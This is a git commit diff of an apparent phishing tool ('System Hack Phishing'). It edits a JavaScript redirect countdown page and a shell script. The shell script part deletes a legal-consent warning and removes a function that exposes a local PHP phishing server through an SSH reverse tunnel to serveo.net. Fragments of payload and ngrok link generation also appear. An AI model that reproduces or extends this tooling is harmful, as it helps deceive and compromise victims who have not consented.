49281cd06f79e4cb6149c317dd74dddfc4074dd9
ankitRay1 <guser3288@gmail.com>
2020-04-09 17:56:47 +0530

    Few bugs removed

--- phone.js
+++ phone.js
@@ -1,6 +1,6 @@
 var count = 8;
-// var redirect = "https://www.ankitray1github.io";
- 
+
+
 function countDown(){
     var timer = document.getElementById("timer");
     if(count > 0){
@@ -8,7 +8,5 @@ function countDown(){
         timer.innerHTML = "This page will redirect in "+count+" seconds.";
         setTimeout("countDown()", 1000);
     }
-    // else{
-    //     window.location.href = alert("Please click on the  redirecting  link...");
-    // }
+    
 }
--- system.sh
+++ system.sh
@@ -5,16 +5,17 @@ trap 'printf "\n";stop' 2
 
 banner() {
 
+ "
+    _    _   _  _ __ __ _____
+   / \  | \ | | |/ /_ _|_   _|
+  / _ \ |  \| | ' / | |  | |
+ / ___ \| |\  | . \ | |  | |
+/_/   \_\_| \_|_|\_\___| |_|
+"
 
-printf "*************************************************************"
-printf "*                  System Hack Phishing                     *"
-printf "*                  Made By  Ankit Roy                       *"
-printf "*                  (ankitRay1, coder0101001)                *"
-printf "*************************************************************"
+printf "\e[1;77m\e[0m\e[1;33mv1.0\e[0m\n"
 
 
-printf " Attacking targets without prior mutual consent\n"
-printf " is illegal!\n"
 
 printf "\n"
 
@@ -116,35 +117,7 @@ done
 
 }
 
-### SERVEO DISABLED
-server() {
 
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
-
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
-
-if [[ $checkphp == *'php'* ]]; then
-killall -2 php > /dev/null 2>&1
-fi
-
-if [[ $subdomain_resp == true ]]; then
-
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
-
-sleep 8
-else
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
-
-sleep 8
-fi
-printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
-fuser -k 3333/tcp > /dev/null 2>&1
-php -S localhost:3333 > /dev/null 2>&1 &
-sleep 3
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
-
-}
 
 
 payload_ngrok() {
@@ -272,18 +245,9 @@ sed 's+forwarding_link+'$link'+g' template.html | sed 's+payload_name+'$payload_
 
 start() {
 
-default_choose_sub="Y"
-default_subdomain="saycheese$RANDOM"
 
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
-read choose_sub
-choose_sub="${choose_sub:-${default_choose_sub}}"
-if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
-subdomain_resp=true
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
-read subdomain
-subdomain="${subdomain:-${default_subdomain}}"
-fi
+
+
 
 server
 payload
